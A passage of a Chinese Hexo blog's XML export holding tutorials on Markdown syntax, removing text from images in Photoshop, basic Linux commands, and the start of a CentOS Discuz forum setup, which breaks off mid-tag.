//这里需要注意，没有空行间隔，忽略降级引用标记<br>射鸡虱 //这里需要注意，没有空行间隔，忽略降级引用标记</p></blockquote></blockquote></blockquote></blockquote><blockquote><blockquote><p>两栖类动物</p><blockquote><p>大鳄鱼<br>唐老鸭</p></blockquote></blockquote></blockquote><p>两个回车结束引用,不在引用范围内了！</p><h2 id="1-10-修改图片"><a href="#1-10-修改图片" class="headerlink" title="1.10 修改图片"></a>1.10 修改图片</h2><h3 id="1-10-1-设置图片尺寸"><a href="#1-10-1-设置图片尺寸" class="headerlink" title="1.10.1 设置图片尺寸"></a>1.10.1 设置图片尺寸</h3><p>在 markdown 直接使用提供的语法引入图片是无法设置大小的，所以我们需要用到 html 的 img 标签。</p><p>复制</p><pre><code>&lt;img width="  " alt="描述" src="url"/&gt;</code></pre><p>例如：</p><p>复制</p><pre><code>&lt;img width="267px" alt="欢迎来访呀朋友" src="https://raw.githubusercontent.com/wugenqiang/picGo/master/pictures/013.jpg"/&gt;</code></pre><p>效果如下：</p><p><a href="https://raw.githubusercontent.com/wugenqiang/picGo/master/pictures/013.jpg" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/wugenqiang/picGo/master/pictures/013.jpg" alt="欢迎来访呀朋友">欢迎来访呀朋友</a></p><p>在 markdown 设置图片居中是需要通过 div 来控制的。</p><p>复制</p><pre><code>&lt;div align=center&gt;&lt;img width="267px" alt="欢迎来访呀朋友" src="https://raw.githubusercontent.com/wugenqiang/picGo/master/pictures/013.jpg"/&gt;&lt;/div&gt;</code></pre><p>效果如下：</p><p><a href="https://raw.githubusercontent.com/wugenqiang/picGo/master/pictures/013.jpg" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/wugenqiang/picGo/master/pictures/013.jpg" alt="欢迎来访呀朋友">欢迎来访呀朋友</a></p><h2 id="1-11-插入代码块"><a href="#1-11-插入代码块" class="headerlink" title="1.11 插入代码块"></a>1.11 插入代码块</h2><p>Markdown在IT圈子里面比较流行的一个重要原因是，它能够轻松漂亮地插入代码。<br>方法是，使用三个反引号 ` 进行包裹即可。如果是行内代码引用，使用单个反引号进行包裹</p><p>代码块语法遵循标准 <code>markdown</code> 代码，使用 <code>开始 ，</code> 结束 例如：</p><p>复制</p><pre><code>​```Python#!/usr/bin/env python# -*- coding: utf-8 -*-print 'Hello World! ```</code></pre><p>以上标记显示效果如下：</p><p>复制</p><pre><code>#!/usr/bin/env python# -*- coding: utf-8 -*-print 'Hello World!</code></pre><p>注：很多人不知道怎么输入反引号。在英文模式下，找到键盘最左侧esc键下面的第一个键点击即可。<br>有人会问：<br>如何在代码块中打出 <code>实际上是使用 4个` 包含 3个` 就可以了，想表示更多，最外层+1就好了。\````\</code><br>```<br>````</p><h2 id="1-12-插入表格"><a href="#1-12-插入表格" class="headerlink" title="1.12 插入表格"></a>1.12 插入表格</h2><p>表格是Markdown语法中比较复杂的一个，其语法如下：</p><p>复制</p><pre><code>列1   | 列2 | 列3 ----- | --- | ---- 第1行 | 12  | 13  第2行 | 22  | 23  第3行 | 32  | 33</code></pre><p>以上标记显示效果如下：</p><table><thead><tr><th align="left">列1</th><th align="left">列2</th><th align="left">列3</th></tr></thead><tbody><tr><td align="left">第1行</td><td align="left">12</td><td align="left">13</td></tr><tr><td align="left">第2行</td><td align="left">22</td><td align="left">23</td></tr><tr><td align="left">第3行</td><td align="left">32</td><td align="left">33</td></tr></tbody></table><p>可以使用<code>冒号</code>来定义对齐方式：</p><p>全居中样式：</p><p>复制</p><pre><code>表头|条目一|条目二:---:|:---:|:---:项目|项目一|项目二</code></pre><p>以上标记显示效果如下：</p><table><thead><tr><th align="center">表头</th><th align="center">条目一</th><th align="center">条目二</th></tr></thead><tbody><tr><td align="center">项目</td><td align="center">项目一</td><td align="center">项目二</td></tr></tbody></table><p>可能有人喜欢左对齐或者右对齐，也可以设置:</p><p>复制</p><pre><code>| 左对齐    |  右对齐 | 居中 || :-------- | -------:| :--: || Computer  | 5000 元 |  1台 || Phone     | 1999 元 |  1部 |</code></pre><p>以上标记显示效果如下：</p><table><thead><tr><th align="left">左对齐</th><th align="right">右对齐</th><th align="center">居中</th></tr></thead><tbody><tr><td align="left">Computer</td><td align="right">5000 元</td><td align="center">1台</td></tr><tr><td align="left">Phone</td><td align="right">1999 元</td><td align="center">1部</td></tr></tbody></table><p>注：三个短竖杠左右的冒号用于控制对齐方式，只放置左边冒号表示文字居左，只放置右边冒号表示文字居右，如果两边都放置冒号表示文字居中。</p><h2 id="1-13-特殊符号处理"><a href="#1-13-特殊符号处理" class="headerlink" title="1.13 特殊符号处理"></a>1.13 特殊符号处理</h2><p>Markdown使用反斜杠\插入语法中用到的特殊符号。在Markdown中，主要有以下几种特殊符号需要处理：</p><p>复制</p><pre><code>\   反斜线`   反引号*   星号_   底线{}  花括号[]  方括号()  括弧#   井字号+   加号-   减号.   英文句点!   惊叹号</code></pre><p>例如，如果你需要插入反斜杠，就连续输入两个反斜杠即可：\ \ =&gt; \ 。</p><p>注：在内容中输入以上特殊符号的时候一定要注意转义，否则将导致内容显示不全，甚至排版混乱。</p><p>重要：MarkDown表格中使用竖线，如何做？</p><p>表格中使用竖线    竖线数目<br>|    一个竖线: &amp; # 1 2 4 ;<br>||    两个竖线: &amp; # 1 2 4 ; &amp; # 1 2 4 ;</p><h2 id="1-14-文本居中引用"><a href="#1-14-文本居中引用" class="headerlink" title="1.14 文本居中引用"></a>1.14 文本居中引用</h2><p>复制</p><pre><code>{% cq %}人生乃是一面镜子，从镜子里认识自己，我要称之为头等大事，也只是我们追求的目的！{% endcq %}</code></pre><p>以上标记显示效果如下：</p><blockquote><p>人生乃是一面镜子，<br>从镜子里认识自己，<br>我要称之为头等大事，<br>也只是我们追求的目的！</p></blockquote><p>注：如果想修改字号，可以如下面这样设置：</p><p>复制</p><pre><code>&lt;font size="4"&gt;{% cq %}  人生乃是一面镜子，  从镜子里认识自己，  我要称之为头等大事，  也只是我们追求的目的！{% endcq %}&lt;/font&gt;</code></pre><p>以上标记显示效果如下：</p><p>人生乃是一面镜子，<br>从镜子里认识自己，<br>我要称之为头等大事，<br>也只是我们追求的目的！</p><p>复制</p><pre><code>&lt;div class="note default"&gt;&lt;p&gt;default&lt;/p&gt;&lt;/div&gt;</code></pre><p>以上标记显示效果如下：</p><p>default</p><p>复制</p><pre><code>&lt;div class="note primary"&gt;&lt;p&gt;primary&lt;/p&gt;&lt;/div&gt;</code></pre><p>以上标记显示效果如下：</p><p>primary</p><p>复制</p><pre><code>&lt;div class="note success"&gt;&lt;p&gt;success&lt;/p&gt;&lt;/div&gt;</code></pre><p>以上标记显示效果如下：</p><p>success</p><p>复制</p><pre><code>&lt;div class="note warning"&gt;&lt;p&gt;warning&lt;/p&gt;&lt;/div&gt;</code></pre><p>以上标记显示效果如下：</p><p>warning</p><p>复制</p><pre><code>&lt;div class="note danger"&gt;&lt;p&gt;danger&lt;/p&gt;&lt;/div&gt;</code></pre><p>以上标记显示效果如下：</p><p>danger</p><p>在<code>主题配置文件</code>中需要配置下:</p><p>复制</p><pre><code># Note tag (bs-callout).note:  # 风格  style: flat  # 要不要图标  icons: true  # 圆角矩形  border_radius: 3  light_bg_offset: 0</code></pre><h2 id="1-16-文字处理"><a href="#1-16-文字处理" class="headerlink" title="1.16 文字处理"></a>1.16 文字处理</h2><h3 id="1-16-1-文字背景色"><a href="#1-16-1-文字背景色" class="headerlink" title="1.16.1 文字背景色"></a>1.16.1 文字背景色</h3><p>复制</p><pre><code>&lt;table&gt;&lt;tr&gt;&lt;td bgcolor=#FFFF00&gt;背景色的设置是按照十六进制颜色值：#FFFF00&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;table&gt;&lt;tr&gt;&lt;td bgcolor=#D1EEEE&gt;背景色的设置是按照十六进制颜色值：#D1EEEE&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;table&gt;&lt;tr&gt;&lt;td bgcolor=#C0FF3E&gt;背景色的设置是按照十六进制颜色值：#C0FF3E&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;table&gt;&lt;tr&gt;&lt;td bgcolor=#54FF9F&gt;背景色的设置是按照十六进制颜色值：#54FF9F&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;</code></pre><p>效果如下：</p><h3 id="1-16-2-文字字体"><a href="#1-16-2-文字字体" class="headerlink" title="1.16.2 文字字体"></a>1.16.2 文字字体</h3><p>复制</p><pre><code>&lt;font face="黑体"&gt;我是黑体字&lt;/font&gt;&lt;font face="宋体"&gt;我是宋体字&lt;/font&gt;&lt;font face="微软雅黑"&gt;我是微软雅黑字&lt;/font&gt;</code></pre><p>效果如下：</p><p>我是黑体字<br>我是宋体字<br>我是微软雅黑字</p><h3 id="1-16-3-文字大小"><a href="#1-16-3-文字大小" class="headerlink" title="1.16.3 文字大小"></a>1.16.3 文字大小</h3><p>复制</p><pre><code>size为1：&lt;font size="1"&gt;size为1&lt;/font&gt;size为2：&lt;font size="2"&gt;size为2&lt;/font&gt;size为3：&lt;font size="3"&gt;size为3&lt;/font&gt;size为4：&lt;font size="4"&gt;size为4&lt;/font&gt;size为10：&lt;font size="10"&gt;size为10&lt;/font&gt;</code></pre><p>效果如下：</p><p>size为1：size为1<br>size为2：size为2<br>size为3：size为3<br>size为4：size为4<br>size为10：size为10</p><h3 id="1-16-4-文字颜色"><a href="#1-16-4-文字颜色" class="headerlink" title="1.16.4 文字颜色"></a>1.16.4 文字颜色</h3><p>复制</p><pre><code>红色文字：&lt;font color="red"&gt;红色文字&lt;/font&gt;浅红色文字：&lt;font color="#dd0000"&gt;浅红色文字&lt;/font&gt; 蓝色文字：&lt;font color="blue"&gt;蓝色文字&lt;/font&gt;浅蓝色文字：&lt;font color="#0000dd"&gt;浅蓝色文字&lt;/font&gt;绿色文字：&lt;font color="green"&gt;绿色文字&lt;/font&gt;金黄色文字：&lt;font color="#FFFF00"&gt;金黄色文字&lt;/font&gt;浅黄色文字：&lt;font color="#dddd00"&gt;浅黄色文字&lt;/font&gt; 深黄色文字：&lt;font color="#666600"&gt;深黄色文字&lt;/font&gt;</code></pre><p>效果如下：</p><p>红色文字：红色文字<br>浅红色文字：浅红色文字<br>蓝色文字：蓝色文字<br>浅蓝色文字：浅蓝色文字<br>绿色文字：绿色文字<br>金黄色文字：金黄色文字<br>浅黄色文字：浅黄色文字<br>深黄色文字：深黄色文字</p><p>需要其它更多的颜色，可以到下面这个网址查更多颜色的 RGB，或者直接用颜色的英文代替 RGB<br><a href="http://www.114la.com/other/rgb.htm" target="_blank" rel="noopener">RGB颜色查询对照表</a></p><h3 id="1-16-4-同时改变字体，字号和颜色"><a href="#1-16-4-同时改变字体，字号和颜色" class="headerlink" title="1.16.4 同时改变字体，字号和颜色"></a>1.16.4 同时改变字体，字号和颜色</h3><p>复制</p><pre><code>&lt;font face="字体" size="字号" color="颜色"&gt;这里是需要突出显示的内容&lt;/font&gt;&lt;font face="黑体"&gt;我是黑体字&lt;/font&gt;&lt;font face="微软雅黑"&gt;我是微软雅黑&lt;/font&gt;&lt;font face="STCAIYUN"&gt;我是华文彩云&lt;/font&gt;&lt;font color=red&gt;我是红色&lt;/font&gt;&lt;font color=#008000&gt;我是绿色&lt;/font&gt;&lt;font color=Blue&gt;我是蓝色&lt;/font&gt;&lt;font size=5&gt;我是尺寸&lt;/font&gt;&lt;font face="黑体" color=green size=5&gt;我是黑体，绿色，尺寸为5&lt;/font&gt;</code></pre><p>效果如下：</p><p>这里是需要突出显示的内容<br>我是黑体字<br>我是微软雅黑<br>我是华文彩云<br>我是红色<br>我是绿色<br>我是蓝色<br>我是尺寸<br>我是黑体，绿色，尺寸为5</p><h2 id="1-17-使用Emoji表情"><a href="#1-17-使用Emoji表情" class="headerlink" title="1.17 使用Emoji表情"></a>1.17 使用Emoji表情</h2><p>使用前首先要开启 <code>emoji</code>，默认是不显示的，参考：<a href="https://blog.enjoytoshare.club/article/hexo-do-optimization.html#3-27-开启emoji表情" target="_blank" rel="noopener">开启emoji表情</a><br>开启 <code>emoji</code> 后进行操作</p><p>举例：</p><p>复制</p><pre><code>Hello Hexo NexT :smile:</code></pre><p>效果：</p><p>Hello Hexo NexT 😄</p><p>更多可用 Emoji 代码参见 <a href="https://www.webfx.com/tools/emoji-cheat-sheet/" target="_blank" rel="noopener">emoji-cheat-sheet</a> 和 <a href="https://www.emojicopy.com/" target="_blank" rel="noopener">emojicopy</a></p><h2 id="1-18-复选框列表-github可用-hexo不支持"><a href="#1-18-复选框列表-github可用-hexo不支持" class="headerlink" title="1.18 复选框列表(github可用,hexo不支持)"></a>1.18 复选框列表(github可用,hexo不支持)</h2><p>在列表符号后面加上 <code>[x]</code> 或者 <code>[ ]</code> 代表<code>选中</code>或者<code>未选中</code>情况</p><p>复制</p><pre><code>- [ ] content -空格[空格]空格content 解释: [ ]括号里面的空格可以换成[x],代表选中对话框</code></pre><ul><li><input checked="" disabled="" type="checkbox"> C</li><li><input checked="" disabled="" type="checkbox"> C++</li><li><input checked="" disabled="" type="checkbox"> Java</li><li><input checked="" disabled="" type="checkbox"> Qt</li><li><input checked="" disabled="" type="checkbox"> Android</li><li><input disabled="" type="checkbox"> C#</li><li><input disabled="" type="checkbox"> .NET</li></ul><h2 id="1-19-脚注"><a href="#1-19-脚注" class="headerlink" title="1.19 脚注"></a>1.19 脚注</h2><p>使用 <code>[^1]</code> <code>[^1]:</code>的脚注对来表示</p><p>复制</p><pre><code>Here is a footnote reference,[^1] and another.[^longnote][^1]: Here is the footnote.[^longnote]: Here's one with multiple blocks.    Subsequent paragraphs are indented to show that they    belong to the previous footnote.</code></pre><p>效果如下：</p><p>Here is a footnote reference,<a href="https://blog.enjoytoshare.club/article/hexo-do-optimization-markdown.html#fn1" target="_blank" rel="noopener">[1]</a> and another.<a href="https://blog.enjoytoshare.club/article/hexo-do-optimization-markdown.html#fn2" target="_blank" rel="noopener">[2]</a></p><h1 id="2-文章编辑"><a href="#2-文章编辑" class="headerlink" title="2 文章编辑"></a>2 文章编辑</h1><h2 id="2-1-文章配置"><a href="#2-1-文章配置" class="headerlink" title="2.1 文章配置"></a>2.1 文章配置</h2><p>在<code>hexo</code>文件夹下右键点击<code>Git Bash here</code>后键入<code>$hexo new page "name"</code>，<code>source/_post</code> 文件夹中就会生成<code>name.md</code>文件，打开后即可编辑，编辑格式如下：</p><p>复制</p><pre><code>---title: 文章名date: 2019-04-09 12:27:52     //发表日期updated: 2019-04-09 13:27:52  //更新日期categories: Markdown          //文章分类tags: [tag1,tag2]             //文章标签，多标签时使用英文逗号隔开photos:                       //如果使用Fancybox（文章头部展示图片），如此设置                                //注意冒号后面有空格---</code></pre><h2 id="2-2-文章折叠"><a href="#2-2-文章折叠" class="headerlink" title="2.2 文章折叠"></a>2.2 文章折叠</h2><p>在要显示的文字末尾添加如下代码实现文章在主页的折叠显示。</p><p>复制</p><pre><code>&lt;!-- more --&gt;</code></pre><hr><ol><li>Here is the footnote. <a href="https://blog.enjoytoshare.club/article/hexo-do-optimization-markdown.html#fnref1" target="_blank" rel="noopener">↩</a></li><li>Here’s one with multiple blocks.<br>Subsequent paragraphs are indented to show that they<br>belong to the previous footnote. <a href="https://blog.enjoytoshare.club/article/hexo-do-optimization-markdown.html#fnref2" target="_blank" rel="noopener">↩</a></li></ol><blockquote><p><a href="https://blog.enjoytoshare.club/article/hexo-do-optimization-markdown.html" target="_blank" rel="noopener">原文</a></p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Markdown语法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何用PS去掉海报图片上的复杂文字</title>
      <link href="/2019/09/12/ru-he-yong-ps-qu-diao-hai-bao-tu-pian-shang-de-fu-za-wen-zi/"/>
      <url>/2019/09/12/ru-he-yong-ps-qu-diao-hai-bao-tu-pian-shang-de-fu-za-wen-zi/</url>
      
        <content type="html"><![CDATA[<p>淘宝开店装修的过程中，经常要做的就是图片设计，有时候遇到心意的海报，非常喜欢但有部分文字需要去掉，一般设计好的海报，文字想要通过某个工具或者快捷键直接去掉的可能性不大，大都需要多个工具的配合使用，下面分享一个案例，面向新手开店卖家，通过简单的操作就可以完成文字的去除。</p><p><a href="http://www.350diy.com/wp-content/uploads/2018/08/1350.jpg" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://www.350diy.com/wp-content/uploads/2018/08/1350.jpg" alt="img"></a></p><p>1、下图中是笔者简单处理之后的效果对比，左侧为原图，右侧为去掉文字后的效果，想要获得更为精致的效果，还需要进一步优化。</p><p><a href="http://www.taoxuemei.com/uploads/allimg/180804/1-1PP4105114-50.jpg" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://www.taoxuemei.com/uploads/allimg/180804/1-1PP4105114-50.jpg" alt="img"></a></p><p>2-1、原图上的文字，一部分是在墙上，另一部分是在模特身上，墙上的文字可以通过污点处理或者修补工具，甚至是内容识别的填充方式，都可以快速简单处理掉，但模特身上的问题就不能直接去掉了，当然如果知道身上文字的字体，重新添加上并且覆盖到原文字上，通过图层混合也可以轻松去除，但对于新手操作起来并不简单，那么下面就从最简单，需要重复操作的方法开始，先来处理模块身上的文字，打开【仿制图章工具】。</p><p><a href="http://www.taoxuemei.com/uploads/allimg/180804/1-1PP4105114-51.jpg" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://www.taoxuemei.com/uploads/allimg/180804/1-1PP4105114-51.jpg" alt="img"></a></p><p>2-2、放大海报图片，并且调小印章大小，可以通过英文字符下的中括号，调大或者调小印章大小，按住键盘上的alt键，左键点击采样，图章工具具有自动融合的功能，不用担心与周围出现突兀的状况。</p><p><a href="http://www.taoxuemei.com/uploads/allimg/180804/1-1PP4105114-52.jpg" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://www.taoxuemei.com/uploads/allimg/180804/1-1PP4105114-52.jpg" alt="img"></a></p><p>2-3、下图为笔者处理完成的效果，印章使用中需要注意模特身上的花纹和明暗线条，不要单纯的去抹掉文字，而是根据衣服花纹的走向，有时候还需要补充和梳理抹掉的区域，这个需要在操作中积累经验，可以多做几次，直到满意为止。</p><p><a href="http://www.taoxuemei.com/uploads/allimg/180804/1-1PP4105114-53.jpg" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://www.taoxuemei.com/uploads/allimg/180804/1-1PP4105114-53.jpg" alt="img"></a></p><p>3-1、模特身上的文字处理完成之后，墙上的文字就比较容易抹去了，可以用的工具和方法也比较多，下面先来介绍一下【修补工具】，</p><p><a href="http://www.taoxuemei.com/uploads/allimg/180804/1-1PP4105114-54.jpg" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://www.taoxuemei.com/uploads/allimg/180804/1-1PP4105114-54.jpg" alt="img"></a></p><p>3-2、画出需要处理掉的区域，上面设置菜单中，切换为【源】，这样只需要按住左键，拖动选区到相似空白区域，就可以被替换掉，并且自动融合，下图中可以向上或者向下，也可以拖动到模特审核空白区域即可。</p><p><a href="http://www.taoxuemei.com/uploads/allimg/180804/1-1PP4105115.jpg" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://www.taoxuemei.com/uploads/allimg/180804/1-1PP4105115.jpg" alt="img"></a></p><p>4-1、除了上述方法，也可以通过套索工具，做出选区，然后右键单击选区，点击【填充】，</p><p><a href="http://www.taoxuemei.com/uploads/allimg/180804/1-1PP4105115-50.jpg" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://www.taoxuemei.com/uploads/allimg/180804/1-1PP4105115-50.jpg" alt="img"></a></p><p>4-2、弹出的界面上，选择为【内容识别】，然后点击【确认】，此功能是自动填充周围信息，自动融合周围环境，</p><p><a href="http://www.taoxuemei.com/uploads/allimg/180804/1-1PP4105115-51.jpg" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://www.taoxuemei.com/uploads/allimg/180804/1-1PP4105115-51.jpg" alt="img"></a></p><p>5、下图为填充后的效果，还是不错的，看不出原来的样子了，最后还可以继续优化，查找失真的地方，进一步填充或者污点修复，直到满意为止。</p><p><a href="http://www.taoxuemei.com/uploads/allimg/180804/1-1PP4105115-52.jpg" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://www.taoxuemei.com/uploads/allimg/180804/1-1PP4105115-52.jpg" alt="img"></a></p><p>图片处理就是逐步完成的过程，不仅仅需要耐心，还需要一种永不满足，追求完美心态，经过多次处理之后才能够把图片处理好，笔者的方法一定不是最好的方法，也一定不是最高级的操作方式，如有更好的ps文字方法，可以在下方留言分享，大家一起学习共同提高。</p><blockquote><p><a href="http://www.350diy.com/diy/5714.html" target="_blank" rel="noopener">转载于</a></p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> PS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux 基础入门</title>
      <link href="/2019/09/08/linux-ji-chu-ru-men/"/>
      <url>/2019/09/08/linux-ji-chu-ru-men/</url>
      
        <content type="html"><![CDATA[<h2 id="目录操作"><a href="#目录操作" class="headerlink" title="目录操作"></a>目录操作</h2><blockquote><p>任务时间：5min ~ 10min</p></blockquote><h3 id="创建目录"><a href="#创建目录" class="headerlink" title="创建目录"></a>创建目录</h3><p>使用 mkdir 命令创建目录</p><pre><code>mkdir $HOME/testFolder</code></pre><h3 id="切换目录"><a href="#切换目录" class="headerlink" title="切换目录"></a>切换目录</h3><p>使用 cd 命令切换目录</p><pre><code>cd $HOME/testFolder</code></pre><p>使用 cd ../ 命令切换到上一级目录</p><pre><code>cd ../</code></pre><h3 id="移动目录"><a href="#移动目录" class="headerlink" title="移动目录"></a>移动目录</h3><p>使用 mv 命令移动目录</p><pre><code>mv $HOME/testFolder /var/tmp</code></pre><h3 id="删除目录"><a href="#删除目录" class="headerlink" title="删除目录"></a>删除目录</h3><p>使用 rm -rf 命令删除目录</p><pre><code>rm -rf /var/tmp/testFolder</code></pre><h3 id="查看目录下的文件"><a href="#查看目录下的文件" class="headerlink" title="查看目录下的文件"></a>查看目录下的文件</h3><p>使用 ls 命令查看 [<a href="https://cloud.tencent.com/developer/labs/lab/10000#stage-1-step-5-etc" target="_blank" rel="noopener">/etc</a>] 目录下所有文件和文件夹</p><pre><code>ls /etc</code></pre><blockquote><p>/etc 目录默认是 *nix 系统的软件配置文件存放位置</p></blockquote><h2 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h2><blockquote><p>任务时间：5min ~ 10min</p></blockquote><h3 id="创建文件"><a href="#创建文件" class="headerlink" title="创建文件"></a>创建文件</h3><p>使用 touch 命令创建文件</p><pre><code>touch ~/testFile</code></pre><p>执行 <code>ls</code> 命令, 可以看到刚才新建的 testFile 文件</p><pre><code>ls ~</code></pre><h3 id="复制文件"><a href="#复制文件" class="headerlink" title="复制文件"></a>复制文件</h3><p>使用 cp 命令复制文件</p><pre><code>cp ~/testFile ~/testNewFile</code></pre><h3 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a>删除文件</h3><p>使用 rm 命令删除文件, 输入 <code>y</code> 后回车确认删除</p><pre><code>rm ~/testFile</code></pre><h3 id="查看文件内容"><a href="#查看文件内容" class="headerlink" title="查看文件内容"></a>查看文件内容</h3><p>使用 cat 命令查看 .bash_history 文件内容</p><pre><code>cat ~/.bash_history</code></pre><h2 id="过滤-管道与重定向"><a href="#过滤-管道与重定向" class="headerlink" title="过滤, 管道与重定向"></a>过滤, 管道与重定向</h2><blockquote><p>任务时间：5min ~ 10min</p></blockquote><h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h3><p>过滤出 /etc/passwd 文件中包含 <code>root</code> 的记录</p><pre><code>grep 'root' /etc/passwd</code></pre><p>递归地过滤出 /var/log/ 目录中包含 <code>linux</code> 的记录</p><pre><code>grep -r 'linux' /var/log/</code></pre><h3 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h3><p>简单来说, Linux 中管道的作用是将上一个命令的输出作为下一个命令的输入, 像 pipe 一样将各个命令串联起来执行, 管道的操作符是 |</p><p>比如, 我们可以将 cat 和 grep 两个命令用管道组合在一起</p><pre><code>cat /etc/passwd | grep 'root'</code></pre><p>过滤出 /etc 目录中名字包含 <code>ssh</code> 的目录(不包括子目录)</p><pre><code>ls /etc | grep 'ssh'</code></pre><h3 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h3><p>可以使用 &gt; 或 &lt; 将命令的输出重定向到一个文件中</p><pre><code>echo 'Hello World' &gt; ~/test.txt</code></pre><h2 id="0x15运维常用命令"><a href="#0x15运维常用命令" class="headerlink" title="0x15运维常用命令"></a>0x15运维常用命令</h2><blockquote><p>任务时间：5min ~ 10min</p></blockquote><h3 id="0x16ping-命令"><a href="#0x16ping-命令" class="headerlink" title="0x16ping 命令"></a>0x16ping 命令</h3><p>对 cloud.tencent.com 发送 4 个 ping 包, 检查与其是否联通</p><pre><code>ping -c 4 cloud.tencent.com</code></pre><h3 id="netstat-命令"><a href="#netstat-命令" class="headerlink" title="netstat 命令"></a>netstat 命令</h3><p>netstat 命令用于显示各种网络相关信息，如网络连接, 路由表, 接口状态等等</p><p>列出所有处于监听状态的tcp端口</p><pre><code>netstat -lt</code></pre><p>查看所有的端口信息, 包括 PID 和进程名称</p><pre><code>netstat -tulpn</code></pre><h3 id="0x18ps-命令"><a href="#0x18ps-命令" class="headerlink" title="0x18ps 命令"></a>0x18ps 命令</h3><p>过滤得到当前系统中的 ssh 进程信息</p><pre><code>ps aux | grep 'ssh'</code></pre><h3 id="完成实验"><a href="#完成实验" class="headerlink" title="完成实验"></a>完成实验</h3><h1 id="实验地址"><a href="#实验地址" class="headerlink" title="实验地址"></a><a href="https://cloud.tencent.com/developer/labs/lab/10000" target="_blank" rel="noopener">实验地址</a></h1><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 腾讯云开发者实验室 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux常用指令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于 CentOS 搭建 Discuz 论坛</title>
      <link href="/2019/09/08/ji-yu-centos-da-jian-discuz-lun-tan/"/>
      <url>/2019/09/08/ji-yu-centos-da-jian-discuz-lun-tan/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00腾讯云实验环境"><a href="#0x00腾讯云实验环境" class="headerlink" title="0x00腾讯云实验环境"></a>0x00<a href="https://cloud.tencent.com/developer/labs/lab/10030" target="_blank" rel="noopener">腾讯云实验环境</a></h1><h2 id="1x00准备-LAMP-环境"><a href="#1x00准备-LAMP-环境" class="headerlink" title="1x00准备 LAMP 环境"></a>1x00准备 LAMP 环境</h2><blockquote><p>任务时间：15min ~ 30min</p></blockquote><p>LAMP 是 Linux、Apache、MySQL 和 PHP 的缩写，是 Discuz 论坛系统依赖的基础运行环境。我们先来准备 LAMP 环境</p><h3 id="1x01安装-MySQL"><a href="#1x01安装-MySQL" class="headerlink" title="1x01安装 MySQL"></a>1x01安装 MySQL</h3><p>使用 <code>yum</code> 安装 MySQL：</p><pre><code>yum install mysql-server -y</code></pre><p>安装完成后，启动 MySQL 服务：</p><pre><code>service mysqld restart</code></pre><p>此实验使用 mysql 默认账户名和密码，您也可以设置自己的 MySQL 账户名和密码：[<a 